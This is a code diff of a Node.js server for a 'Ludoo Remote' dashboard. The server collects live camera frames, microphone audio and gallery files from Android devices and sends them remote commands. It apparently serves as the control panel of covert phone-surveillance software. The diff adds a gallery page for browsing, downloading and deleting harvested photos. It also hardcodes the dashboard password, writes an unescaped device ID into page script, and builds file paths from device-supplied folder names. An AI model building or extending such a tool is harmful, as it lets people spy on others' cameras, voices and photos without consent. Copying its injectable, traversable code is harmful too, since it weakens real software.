@@ -23,18 +23,11 @@ if (!fs.existsSync(GALLERY_DIR)) {
     fs.mkdirSync(GALLERY_DIR, { recursive: true });
 }
 
-let galleryData = {}; // { deviceId: [ {name, type, size, date, path} ] }
+let galleryData = {};
 
 // ========== AUTH ==========
 const DASHBOARD_PASSWORD = 'ajaybabu95';
-const SECRET_FILE = path.join(__dirname, '.session_secret');
-let SESSION_SECRET;
-if (fs.existsSync(SECRET_FILE)) {
-    SESSION_SECRET = fs.readFileSync(SECRET_FILE, 'utf8').trim();
-} else {
-    SESSION_SECRET = crypto.randomBytes(32).toString('hex');
-    fs.writeFileSync(SECRET_FILE, SESSION_SECRET);
-}
+const SESSION_SECRET = crypto.randomBytes(32).toString('hex');
 const VALID_TOKEN = crypto.createHmac('sha256', SESSION_SECRET).update(DASHBOARD_PASSWORD).digest('hex');
 
 function parseCookies(req) {
@@ -95,16 +88,15 @@ function resolveLatestFrame(deviceId) {
     return bestFrame || null;
 }
 
-// Cleanup stale devices every 15s
 setInterval(() => {
     const now = Date.now();
     devices = devices.filter(device => {
         const lastSeen = device.lastSeen || 0;
         const hasRecentFrames = frameQueues[device.id] && frameQueues[device.id].length > 0 &&
             latestFrames[device.id] && (now - (latestFrames[device.id].ts || 0)) < 30000;
-        const stale = (now - lastSeen) > 300000 && !hasRecentFrames;
+        const stale = (now - lastSeen) > 60000 && !hasRecentFrames;
         if (stale) {
-            console.log(`🗑️ Removing stale device: ${device.id}`);
+            console.log(`🧹 Removing stale device: ${device.id}`);
             delete deviceHeartbeats[device.id];
             delete pendingCommands[device.id];
             delete latestFrames[device.id];
@@ -119,11 +111,10 @@ setInterval(() => {
 
 // ========== HTTP API ==========
 
-// REGISTER DEVICE
 app.post('/api/register', (req, res) => {
     try {
         const { deviceId, deviceName } = req.body;
-        console.log(`✅ Device registered: ${deviceId} (${deviceName})`);
+        console.log(`📱 Device registered: ${deviceId} (${deviceName})`);
         let device = devices.find(d => d.id === deviceId);
         if (!device) {
             device = {
@@ -143,7 +134,6 @@ app.post('/api/register', (req, res) => {
     }
 });
 
-// HEARTBEAT
 app.post('/api/heartbeat', (req, res) => {
     try {
         const {
@@ -180,7 +170,6 @@ app.post('/api/heartbeat', (req, res) => {
 
 // ========== GALLERY API ==========
 
-// ✅ Receive gallery metadata from Android
 app.post('/api/sync/gallery', (req, res) => {
     try {
         const { deviceId, files, count } = req.body;
@@ -190,17 +179,15 @@ app.post('/api/sync/gallery', (req, res) => {
             return res.status(400).json({ success: false, error: 'Missing deviceId' });
         }
 
-        // Store metadata
         galleryData[deviceId] = files.map(f => ({
             name: f.name,
             type: f.type,
             size: f.size,
             date: f.date || Date.now(),
             path: f.path || f.name,
-            folder: f.folder || f.albumName || f.bucketName || null
+            folder: f.folder || 'Root'
         }));
 
-        // Create device folder
         const deviceDir = path.join(GALLERY_DIR, deviceId);
         if (!fs.existsSync(deviceDir)) {
             fs.mkdirSync(deviceDir, { recursive: true });
@@ -214,41 +201,18 @@ app.post('/api/sync/gallery', (req, res) => {
     }
 });
 
-// ✅ Get gallery metadata for a device (with folder grouping)
 app.get('/api/gallery/:deviceId', (req, res) => {
     try {
         const { deviceId } = req.params;
         const files = galleryData[deviceId] || [];
         
-        // Sort by date (newest first)
         files.sort((a, b) => (b.date || 0) - (a.date || 0));
 
-        // Group by folder — smart path parsing for Android gallery folders
-        const SKIP_DIRS = new Set(['0','emulated','storage','sdcard','Android','media','user','self']);
-        function extractFolder(file) {
-            // 1. Use bucketName/albumName only if it looks meaningful (not generic)
-            const generic = new Set(['media','Media','files','Files','all','All','root','Root']);
-            const named = file.folder || file.albumName || file.bucketName;
-            if (named && !generic.has(named)) return named;
-            // 2. Extract from path
-            if (file.path) {
-                const parts = file.path.replace(/\\/g, '/').split('/');
-                // Skip the filename (last part) and walk backwards
-                for (let i = parts.length - 2; i >= 0; i--) {
-                    const seg = parts[i];
-                    if (!seg) continue;
-                    if (SKIP_DIRS.has(seg)) continue;
-                    if (seg.includes('.') && seg.split('.').length >= 3) continue; // skip com.app.pkg
-                    return seg;
-                }
-            }
-            return named || 'Other';
-        }
         const folders = {};
         files.forEach(file => {
-            const folder = extractFolder(file);
-            if (!folders[folder]) folders[folder] = [];
-            folders[folder].push(file);
+            const folderName = file.folder || 'Root';
+            if (!folders[folderName]) folders[folderName] = [];
+            folders[folderName].push(file);
         });
 
         const device = devices.find(d => d.id === deviceId);
@@ -270,7 +234,6 @@ app.get('/api/gallery/:deviceId', (req, res) => {
     }
 });
 
-// ✅ Get single file (on-demand fetch from Android)
 app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
     try {
         const { deviceId, fileName } = req.params;
@@ -308,7 +271,6 @@ app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
     }
 });
 
-// ✅ Upload single file from Android
 app.post('/api/upload/file', (req, res) => {
     try {
         const { deviceId, file } = req.body;
@@ -320,11 +282,12 @@ app.post('/api/upload/file', (req, res) => {
         console.log(`📤 File uploaded: ${file.name} from ${deviceId} (${file.size} bytes)`);
 
         const deviceDir = path.join(GALLERY_DIR, deviceId);
-        if (!fs.existsSync(deviceDir)) {
-            fs.mkdirSync(deviceDir, { recursive: true });
+        const folderDir = path.join(deviceDir, file.folder || 'Root');
+        if (!fs.existsSync(folderDir)) {
+            fs.mkdirSync(folderDir, { recursive: true });
         }
 
-        const filePath = path.join(deviceDir, file.name);
+        const filePath = path.join(folderDir, file.name);
         const buffer = Buffer.from(file.data, 'base64');
         fs.writeFileSync(filePath, buffer);
 
@@ -339,7 +302,8 @@ app.post('/api/upload/file', (req, res) => {
                 type: file.type || 'image',
                 size: file.size || buffer.length,
                 date: file.date || Date.now(),
-                path: file.name
+                path: file.name,
+                folder: file.folder || 'Root'
             });
         }
 
@@ -354,7 +318,6 @@ app.post('/api/upload/file', (req, res) => {
     }
 });
 
-// ✅ Delete file
 app.delete('/api/gallery/file/:deviceId/:fileName', (req, res) => {
     try {
         const { deviceId, fileName } = req.params;
@@ -427,7 +390,7 @@ app.post('/api/voice/data', (req, res) => {
     try {
         const { deviceId, audio, count, timestamp, codec, sampleRate, channels } = req.body;
 
-        console.log(`🎙️ Voice data from ${deviceId}: ${count} packets`);
+        console.log(`🎤 Voice data from ${deviceId}: ${count} packets`);
 
         if (!deviceId) {
             return res.status(400).json({ success: false, error: 'deviceId required' });
@@ -455,7 +418,6 @@ app.post('/api/voice/data', (req, res) => {
     }
 });
 
-// FRAME UPLOAD
 app.post('/api/frame', (req, res) => {
     try {
         const { deviceId, image, quality, fps, camera } = req.body;
@@ -487,7 +449,6 @@ app.post('/api/frame', (req, res) => {
     }
 });
 
-// BATCH UPLOAD
 app.post('/api/batch', (req, res) => {
     try {
         const { deviceId, frames, count, timestamp, fps, quality } = req.body;
@@ -541,7 +502,7 @@ app.post('/api/batch', (req, res) => {
                 lastHeartbeat: new Date().toLocaleTimeString()
             };
             devices.push(dev);
-            console.log(`✅ Auto-registered from batch: ${deviceId}`);
+            console.log(`📱 Auto-registered from batch: ${deviceId}`);
         }
         dev.lastSeen = Date.now();
         dev.lastHeartbeat = new Date().toLocaleTimeString();
@@ -557,7 +518,6 @@ app.post('/api/batch', (req, res) => {
     }
 });
 
-// FRAME FETCH
 app.get('/api/frame/:deviceId', (req, res) => {
     const { deviceId } = req.params;
 
@@ -572,7 +532,6 @@ app.get('/api/frame/:deviceId', (req, res) => {
     res.json({ success: true, image: frame.image, ts: frame.ts });
 });
 
-// FLIP CAMERA
 app.post('/api/flip', (req, res) => {
     try {
         const { deviceId, camera } = req.body;
@@ -588,7 +547,7 @@ app.post('/api/flip', (req, res) => {
         const cmd = { command: 'flip', value: camera };
         if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
         pendingCommands[deviceId].push(cmd);
-        console.log(`✅ Flip queued: camera=${camera}`);
+        console.log(`📦 Flip queued: camera=${camera}`);
 
         res.json({ success: true, settings: ds, command: cmd });
     } catch (e) {
@@ -596,11 +555,10 @@ app.post('/api/flip', (req, res) => {
     }
 });
 
-// COMMAND SEND
 app.post('/api/command', (req, res) => {
     try {
         const { deviceId, command, value } = req.body;
-        console.log(`📡 HTTP Command: [${command}] for [${deviceId}]`);
+        console.log(`📨 HTTP Command: [${command}] for [${deviceId}]`);
 
         const ds = getDeviceSettings(deviceId);
         switch (command) {
@@ -616,7 +574,7 @@ app.post('/api/command', (req, res) => {
         if (deviceId) {
             if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
             pendingCommands[deviceId].push(cmd);
-            console.log(`✅ Command queued: ${command} (value: ${value ?? 'none'})`);
+            console.log(`📦 Command queued: ${command} (value: ${value ?? 'none'})`);
         }
 
         res.json({ success: true, settings: getDeviceSettings(deviceId) });
@@ -625,7 +583,6 @@ app.post('/api/command', (req, res) => {
     }
 });
 
-// COMMAND POLL
 app.get('/api/commands/:deviceId', (req, res) => {
     try {
         const { deviceId } = req.params;
@@ -648,7 +605,6 @@ app.get('/api/commands/:deviceId', (req, res) => {
     }
 });
 
-// DEVICE STATUS UPDATE
 app.post('/api/device-status', (req, res) => {
     try {
         const { deviceId, cameraReady, streaming, cameraType, cameraPermission, status } = req.body;
@@ -667,7 +623,6 @@ app.post('/api/device-status', (req, res) => {
     }
 });
 
-// DEVICES LIST
 app.get('/api/devices', (req, res) => {
     const now = Date.now();
     res.json({
@@ -681,7 +636,7 @@ app.get('/api/devices', (req, res) => {
             cameraPermission: d.cameraPermission || false,
             batteryOptimization: d.batteryOptimization || false,
             batteryPercentage: d.batteryPercentage || 0,
-            isConnected: (now - (d.lastSeen || 0)) < 300000,
+            isConnected: (now - (d.lastSeen || 0)) < 60000,
             hasWebSocket: !!activeStreams[d.id],
             lastHeartbeat: d.lastHeartbeat,
             connectedAt: d.connectedAt,
@@ -691,7 +646,6 @@ app.get('/api/devices', (req, res) => {
     });
 });
 
-// DEVICE DETAIL
 app.get('/api/device/:deviceId', (req, res) => {
     const device = devices.find(d => d.id === req.params.deviceId);
     if (!device) return res.status(404).json({ success: false, error: 'Not found' });
@@ -700,7 +654,7 @@ app.get('/api/device/:deviceId', (req, res) => {
         success: true,
         device: {
             ...device,
-            isConnected: (now - (device.lastSeen || 0)) < 300000,
+            isConnected: (now - (device.lastSeen || 0)) < 60000,
             hasWebSocket: !!activeStreams[device.id],
             galleryCount: (galleryData[device.id] || []).length,
             settings: getDeviceSettings(device.id)
@@ -708,7 +662,6 @@ app.get('/api/device/:deviceId', (req, res) => {
     });
 });
 
-// HEALTH
 app.get('/api/health', (req, res) => res.json({
     status: 'ok',
     devices: devices.length,
@@ -719,7 +672,6 @@ app.get('/api/health', (req, res) => res.json({
     galleryFiles: Object.keys(galleryData).reduce((acc, key) => acc + (galleryData[key]?.length || 0), 0)
 }));
 
-// DEBUG
 app.get('/api/debug', (req, res) => {
     res.json({
         devices: devices.map(d => d.id),
@@ -750,6 +702,231 @@ app.post('/api/login', (req, res) => {
 app.get('/api/settings', (req, res) => res.json({ success: true, settings: { stream: false, quality: 240, fps: 15 } }));
 
 app.get('/favicon.ico', (req, res) => res.status(204).end());
+
+// ========== GALLERY PAGE ==========
+app.get('/gallery/:deviceId', requireAuth, (req, res) => {
+    const { deviceId } = req.params;
+    
+    res.send(`<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gallery - ${deviceId}</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; min-height:100vh; padding:20px; color:#fff; }
+        .container { max-width:900px; margin:0 auto; }
+        .header { display:flex; justify-content:space-between; align-items:center; padding:15px 0; border-bottom:1px solid #2a2a2a; margin-bottom:20px; flex-wrap:wrap; gap:10px; }
+        .header h1 { font-size:20px; }
+        .header h1 span { color:#667eea; }
+        .back-btn { background:none; border:1px solid #444; color:#aaa; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; text-decoration:none; transition:all .2s; }
+        .back-btn:hover { border-color:#667eea; color:#fff; }
+        .stats { display:flex; gap:20px; flex-wrap:wrap; margin-bottom:20px; padding:15px; background:#1a1a1a; border-radius:12px; border:1px solid #2a2a2a; }
+        .stat-item { font-size:13px; color:#888; }
+        .stat-item strong { color:#fff; }
+        .sync-btn { background:#4CAF50; border:none; color:white; padding:8px 20px; border-radius:8px; cursor:pointer; font-size:13px; transition:all .2s; }
+        .sync-btn:hover { opacity:.8; }
+        .sync-btn:disabled { opacity:.5; cursor:not-allowed; }
+        .folder-section { margin-bottom:25px; }
+        .folder-title { font-size:16px; font-weight:600; color:#667eea; margin-bottom:10px; padding:8px 12px; background:#1a1a1a; border-radius:8px; border-left:3px solid #667eea; }
+        .gallery-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px,1fr)); gap:12px; }
+        .gallery-item { background:#1a1a1a; border-radius:12px; overflow:hidden; border:1px solid #2a2a2a; cursor:pointer; transition:all .2s; }
+        .gallery-item:hover { transform:scale(1.03); border-color:#667eea; }
+        .gallery-item .thumb { width:100%; height:150px; display:flex; align-items:center; justify-content:center; font-size:48px; color:#555; background:#111; }
+        .gallery-item .info { padding:8px 10px; }
+        .gallery-item .info .name { font-size:11px; color:#ccc; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+        .gallery-item .info .size { font-size:10px; color:#666; }
+        .gallery-item.video .thumb::after { content:'▶'; position:absolute; font-size:40px; color:rgba(255,255,255,.8); text-shadow:0 0 20px rgba(0,0,0,.8); }
+        .gallery-item.video .thumb { position:relative; }
+        .loading { text-align:center; color:#666; padding:40px; }
+        .empty { text-align:center; color:#666; padding:40px; }
+        .empty span { font-size:48px; display:block; margin-bottom:10px; }
+        .viewer { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.95); z-index:9999; align-items:center; justify-content:center; flex-direction:column; }
+        .viewer.active { display:flex; }
+        .viewer img { max-width:95%; max-height:80vh; object-fit:contain; border-radius:8px; }
+        .viewer .controls { display:flex; gap:15px; margin-top:20px; flex-wrap:wrap; justify-content:center; }
+        .viewer .controls button { background:rgba(255,255,255,.1); border:1px solid #444; color:#fff; padding:10px 20px; border-radius:10px; cursor:pointer; font-size:14px; transition:all .2s; }
+        .viewer .controls button:hover { background:#667eea; border-color:#667eea; }
+        .viewer .controls button.danger:hover { background:#f44336; border-color:#f44336; }
+        .viewer .close { position:absolute; top:20px; right:30px; background:none; border:none; color:#fff; font-size:36px; cursor:pointer; }
+        .viewer .close:hover { color:#f44336; }
+        .viewer .info { color:#888; font-size:13px; margin-top:10px; text-align:center; }
+        .viewer .folder-name { color:#667eea; font-size:12px; }
+        @media (max-width:500px){ .gallery-grid { grid-template-columns:repeat(auto-fill, minmax(120px,1fr)); } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div>
+            <a href="/" class="back-btn">← Back</a>
+            <h1 style="display:inline-block;margin-left:15px;">📸 Gallery - <span id="deviceName">${deviceId}</span></h1>
+        </div>
+        <button class="sync-btn" id="syncBtn" onclick="syncGallery()">🔄 Sync</button>
+    </div>
+    <div class="stats" id="stats">
+        <div class="stat-item">📷 Images: <strong id="imgCount">0</strong></div>
+        <div class="stat-item">🎬 Videos: <strong id="vidCount">0</strong></div>
+        <div class="stat-item">📁 Folders: <strong id="folderCount">0</strong></div>
+        <div class="stat-item">📄 Total: <strong id="totalCount">0</strong></div>
+    </div>
+    <div id="galleryContent"><div class="loading">⏳ Loading gallery...</div></div>
+</div>
+
+<div class="viewer" id="viewer">
+    <button class="close" onclick="closeViewer()">✕</button>
+    <img id="viewerImage" src="" alt="Image">
+    <div class="info" id="viewerInfo"></div>
+    <div class="controls">
+        <button onclick="prevImage()">◀ Prev</button>
+        <span id="viewerCounter" style="color:#888;font-size:13px;">1/1</span>
+        <button onclick="nextImage()">Next ▶</button>
+        <button onclick="downloadImage()">⬇ Download</button>
+        <button class="danger" onclick="deleteImage()">🗑 Delete</button>
+    </div>
+</div>
+
+<script>
+    const deviceId = '${deviceId}';
+    let allFiles = [];
+    let currentIndex = 0;
+
+    function loadGallery() {
+        document.getElementById('galleryContent').innerHTML = '<div class="loading">⏳ Loading gallery...</div>';
+        
+        fetch('/api/gallery/' + deviceId)
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    allFiles = data.files || [];
+                    document.getElementById('imgCount').textContent = data.images || 0;
+                    document.getElementById('vidCount').textContent = data.videos || 0;
+                    document.getElementById('folderCount').textContent = data.folderCount || 0;
+                    document.getElementById('totalCount').textContent = data.count || 0;
+                    renderGallery(data.folders);
+                } else {
+                    document.getElementById('galleryContent').innerHTML = '<div class="empty"><span>📭</span>No files found</div>';
+                }
+            })
+            .catch(() => {
+                document.getElementById('galleryContent').innerHTML = '<div class="empty"><span>❌</span>Error loading gallery</div>';
+            });
+    }
+
+    function renderGallery(folders) {
+        if (!folders || Object.keys(folders).length === 0) {
+            document.getElementById('galleryContent').innerHTML = '<div class="empty"><span>📭</span>No files found</div>';
+            return;
+        }
+
+        let html = '';
+        Object.keys(folders).sort().forEach(folderName => {
+            const files = folders[folderName];
+            html += '<div class="folder-section">';
+            html += '<div class="folder-title">📁 ' + folderName + ' (' + files.length + ')</div>';
+            html += '<div class="gallery-grid">';
+            files.forEach((file, idx) => {
+                const globalIndex = allFiles.indexOf(file);
+                const isVideo = file.type === 'video';
+                const sizeMB = (file.size / (1024 * 1024)).toFixed(1);
+                html += '<div class="gallery-item ' + (isVideo ? 'video' : '') + '" onclick="openViewer(' + globalIndex + ')">';
+                html += '<div class="thumb">' + (isVideo ? '🎬' : '📷') + '</div>';
+                html += '<div class="info"><div class="name">' + file.name + '</div><div class="size">' + sizeMB + 'MB</div></div>';
+                html += '</div>';
+            });
+            html += '</div></div>';
+        });
+        document.getElementById('galleryContent').innerHTML = html;
+    }
+
+    function syncGallery() {
+        const btn = document.getElementById('syncBtn');
+        btn.disabled = true;
+        btn.textContent = '⏳ Syncing...';
+        
+        fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId: deviceId, command: 'sync_gallery' })
+        }).catch(() => {});
+        
+        setTimeout(() => {
+            loadGallery();
+            btn.disabled = false;
+            btn.textContent = '🔄 Sync';
+        }, 3000);
+    }
+
+    function openViewer(index) {
+        if (index < 0 || index >= allFiles.length) return;
+        currentIndex = index;
+        const file = allFiles[index];
+        document.getElementById('viewerInfo').innerHTML = 
+            '<span class="folder-name">📁 ' + (file.folder || 'Root') + '</span> • ' + 
+            file.name + ' • ' + (file.size / (1024 * 1024)).toFixed(1) + 'MB';
+        document.getElementById('viewerCounter').textContent = (index + 1) + '/' + allFiles.length;
+        document.getElementById('viewerImage').src = '';
+        document.getElementById('viewerImage').alt = 'Loading...';
+        document.getElementById('viewer').classList.add('active');
+        
+        fetch('/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name))
+            .then(r => r.json())
+            .then(data => {
+                if (data.success && data.data) {
+                    document.getElementById('viewerImage').src = 'data:image/jpeg;base64,' + data.data;
+                } else if (data.pending) {
+                    document.getElementById('viewerImage').alt = '⏳ Requesting from device...';
+                    setTimeout(() => openViewer(index), 3000);
+                } else {
+                    document.getElementById('viewerImage').alt = '❌ Failed to load';
+                }
+            })
+            .catch(() => { document.getElementById('viewerImage').alt = '❌ Error'; });
+    }
+
+    function closeViewer() { document.getElementById('viewer').classList.remove('active'); }
+    function prevImage() { if (currentIndex > 0) openViewer(currentIndex - 1); }
+    function nextImage() { if (currentIndex < allFiles.length - 1) openViewer(currentIndex + 1); }
+
+    function downloadImage() {
+        const img = document.getElementById('viewerImage');
+        if (img.src && img.src.startsWith('data:')) {
+            const link = document.createElement('a');
+            link.href = img.src;
+            link.download = allFiles[currentIndex]?.name || 'image';
+            link.click();
+        }
+    }
+
+    function deleteImage() {
+        if (!confirm('Delete this file?')) return;
+        const file = allFiles[currentIndex];
+        if (!file) return;
+        
+        fetch('/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name), { method: 'DELETE' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    alert('File deleted');
+                    closeViewer();
+                    loadGallery();
+                }
+            })
+            .catch(() => alert('Delete failed'));
+    }
+
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') closeViewer();
+        if (e.key === 'ArrowLeft') prevImage();
+        if (e.key === 'ArrowRight') nextImage();
+    });
+
+    loadGallery();
+</script>
+</body>
+</html>`);
+});
 
 // ========== WEBSOCKET ==========
 
@@ -782,7 +959,7 @@ io.on('connection', (socket) => {
         socket.deviceId = canonicalId;
         socket.join('streamers');
 
-        console.log(`📱 Device [${canonicalId}] registered for WebSocket stream`);
+        console.log(`📡 Device [${canonicalId}] registered for WebSocket stream`);
         socket.emit('settings', getDeviceSettings(canonicalId));
 
         io.emit('device_update', {
@@ -812,7 +989,7 @@ io.on('connection', (socket) => {
         if (streaming !== undefined) device.streaming = streaming;
         device.lastSeen = Date.now();
 
-        console.log(`📊 Status update [${canonicalId}]: cam=${cameraPermission} batt=${batteryOptimization}`);
+        console.log(`🔄 Status update [${canonicalId}]: cam=${cameraPermission} batt=${batteryOptimization}`);
         io.emit('device_update', {
             id: device.id, name: device.name,
             cameraReady: device.cameraReady || false,
@@ -864,7 +1041,7 @@ io.on('connection', (socket) => {
         const { deviceId } = data;
         if (deviceId) {
             socket.join(`stream_${deviceId}`);
-            console.log(`👁️ Dashboard subscribed to ${deviceId}`);
+            console.log(`📺 Dashboard subscribed to ${deviceId}`);
 
             const queue = frameQueues[deviceId];
             if (queue && queue.length > 0) {
@@ -909,7 +1086,7 @@ io.on('connection', (socket) => {
             setTimeout(() => {
                 if (activeStreams[disconnectedId] === socket.id) {
                     delete activeStreams[disconnectedId];
-                    console.log(`📡 Device [${disconnectedId}] WS stream ended`);
+                    console.log(`📴 Device [${disconnectedId}] WS stream ended`);
                 }
             }, 8000);
             console.log(`⚠️ Device [${disconnectedId}] WS drop — waiting 8s for reconnect`);
@@ -919,7 +1096,7 @@ io.on('connection', (socket) => {
     });
 });
 
-// ========== LOGIN / LOGOUT ==========
+// ========== LOGIN ==========
 app.get('/login', (req, res) => {
     if (isAuthenticated(req)) return res.redirect('/');
     const err = req.query.err ? '<p style="color:#f44336;margin-top:12px;font-size:13px;">❌ Wrong password. Try again.</p>' : '';
@@ -944,7 +1121,7 @@ button:hover{opacity:.88;}
 </head>
 <body>
 <div class="card">
-  <div class="lock">🔒</div>
+  <div class="lock">🔐</div>
   <h1>Ludoo Remote</h1>
   <p class="sub">Enter password to access dashboard</p>
   <form method="POST" action="/login">
@@ -971,7 +1148,7 @@ app.get('/logout', (req, res) => {
     res.redirect('/login');
 });
 
-// ========== WEB INTERFACE ==========
+// ========== DASHBOARD ==========
 app.get('/', requireAuth, (req, res) => {
     res.send(`<!DOCTYPE html>
 <html>
@@ -991,8 +1168,6 @@ app.get('/', requireAuth, (req, res) => {
         .stat-label { font-size:11px; color:#888; margin-bottom:5px; }
         .stat-value { font-size:20px; font-weight:700; }
         .stat-value.online { color:#4CAF50; }
-        .ws-badge { display:inline-block; font-size:10px; padding:2px 7px; border-radius:20px; background:#1e3a1e; color:#4CAF50; border:1px solid #2d5a2d; margin-left:6px; vertical-align:middle; }
-        .ws-badge.off { background:#3a1e1e; color:#f44336; border-color:#5a2d2d; }
         .video-container { background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; margin-bottom:20px; border:1px solid #2a2a2a; display:flex; align-items:center; justify-content:center; position:relative; }
         #video { width:100%; height:100%; object-fit:cover; display:none; }
         .video-placeholder { text-align:center; color:#555; }
@@ -1063,66 +1238,14 @@ app.get('/', requireAuth, (req, res) => {
         .logout-btn { position:absolute; top:0; right:0; background:none; border:1px solid #333; color:#666; font-size:11px; padding:5px 11px; border-radius:20px; cursor:pointer; transition:all .2s; text-decoration:none; }
         .logout-btn:hover { border-color:#f44336; color:#f44336; }
         .header { position:relative; }
-
-        /* GALLERY CSS */
-        .gallery-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.92); z-index:3000; overflow-y:auto; padding:20px; }
-        .gallery-modal.active { display:block; }
-        .gallery-header { display:flex; justify-content:space-between; align-items:center; padding:15px 0; border-bottom:1px solid #2a2a2a; margin-bottom:20px; position:sticky; top:0; background:rgba(0,0,0,.9); z-index:10; }
-        .gallery-header h2 { font-size:20px; }
-        .gallery-close { background:none; border:none; color:#fff; font-size:28px; cursor:pointer; padding:0 10px; }
-        .gallery-close:hover { color:#f44336; }
-        .gallery-back { background:none; border:1px solid #444; color:#aaa; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; transition:all .2s; }
-        .gallery-back:hover { border-color:#667eea; color:#fff; }
-        .gallery-stats { font-size:13px; color:#888; margin-left:12px; }
-        .gallery-sync-btn { background:#4CAF50; border:none; color:white; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; transition:all .2s; }
-        .gallery-sync-btn:hover { opacity:.8; }
-        .gallery-sync-btn:disabled { opacity:.5; cursor:not-allowed; }
-
-        /* Folder View */
-        .folder-section { margin-bottom:25px; }
-        .folder-title { font-size:16px; font-weight:600; color:#667eea; margin-bottom:10px; padding:8px 12px; background:#1a1a1a; border-radius:8px; border-left:3px solid #667eea; }
-        .gallery-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px,1fr)); gap:12px; }
-        .gallery-item { background:#1a1a1a; border-radius:12px; overflow:hidden; border:1px solid #2a2a2a; cursor:pointer; transition:all .2s; }
-        .gallery-item:hover { transform:scale(1.03); border-color:#667eea; }
-        .gallery-item img { width:100%; height:150px; object-fit:cover; display:block; }
-        .gallery-item .gallery-item-info { padding:8px 10px; }
-        .gallery-item .gallery-item-name { font-size:11px; color:#ccc; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-        .gallery-item .gallery-item-size { font-size:10px; color:#666; }
-        .gallery-item.video-item { position:relative; }
-        .gallery-item.video-item::after { content:'▶'; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:40px; color:rgba(255,255,255,.8); text-shadow:0 0 20px rgba(0,0,0,.8); }
-        .gallery-loading { text-align:center; color:#666; padding:40px; }
-        .gallery-empty { text-align:center; color:#666; padding:40px; }
-        .gallery-empty span { font-size:48px; display:block; margin-bottom:10px; }
-        .folder-list { display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr)); gap:14px; padding:4px; }
-        .folder-card { background:#1a1a1a; border-radius:14px; border:1px solid #2a2a2a; cursor:pointer; padding:22px 14px 16px; text-align:center; transition:all .2s; }
-        .folder-card:hover { transform:scale(1.04); border-color:#667eea; background:#222; }
-        .folder-card-icon { font-size:40px; margin-bottom:10px; }
-        .folder-card-name { font-size:13px; font-weight:600; color:#ddd; margin-bottom:5px; word-break:break-word; }
-        .folder-card-count { font-size:11px; color:#666; }
-        .folder-files-header { display:flex; align-items:center; gap:12px; margin-bottom:16px; padding:4px 0; }
-        .folder-back-btn { background:none; border:1px solid #444; color:#aaa; font-size:13px; padding:6px 14px; border-radius:8px; cursor:pointer; transition:all .2s; }
-        .folder-back-btn:hover { border-color:#667eea; color:#667eea; }
-
-        /* Image Viewer */
-        .image-viewer { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.95); z-index:4000; align-items:center; justify-content:center; flex-direction:column; }
-        .image-viewer.active { display:flex; }
-        .image-viewer img, .image-viewer video { max-width:95%; max-height:80vh; object-fit:contain; border-radius:8px; }
-        .image-viewer .viewer-controls { display:flex; gap:20px; margin-top:20px; align-items:center; flex-wrap:wrap; justify-content:center; }
-        .image-viewer .viewer-btn { background:rgba(255,255,255,.1); border:1px solid #444; color:#fff; padding:10px 20px; border-radius:10px; cursor:pointer; font-size:14px; transition:all .2s; }
-        .image-viewer .viewer-btn:hover { background:#667eea; border-color:#667eea; }
-        .image-viewer .viewer-btn.danger:hover { background:#f44336; border-color:#f44336; }
-        .image-viewer .viewer-close { position:absolute; top:20px; right:30px; background:none; border:none; color:#fff; font-size:36px; cursor:pointer; }
-        .image-viewer .viewer-close:hover { color:#f44336; }
-        .image-viewer .viewer-info { color:#888; font-size:13px; margin-top:10px; text-align:center; }
-        .image-viewer .viewer-folder { color:#667eea; font-size:12px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>📷 Ludoo Remote</h1>
+        <h1>📹 Ludoo Remote</h1>
         <p id="connMode">Tap on device to view status</p>
-        <a href="/logout" class="logout-btn">🚪 Logout</a>
+        <a href="/logout" class="logout-btn">🔒 Logout</a>
     </div>
     <div class="stats">
         <div class="stat-card"><div class="stat-label">STATUS</div><div class="stat-value online" id="serverStatus">● Online</div></div>
@@ -1145,13 +1268,13 @@ app.get('/', requireAuth, (req, res) => {
     </div>
     <div class="controls">
         <div class="section-title">🎮 CONTROLS</div>
-        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-front" id="frontBtn">🤳 FRONT</button><button class="btn btn-back active-cam" id="backBtn">📷 BACK</button></div>
-        <div class="section-title">🎨 QUALITY</div>
+        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-front" id="frontBtn">📷 FRONT</button><button class="btn btn-back active-cam" id="backBtn">📷 BACK</button></div>
+        <div class="section-title">📐 QUALITY</div>
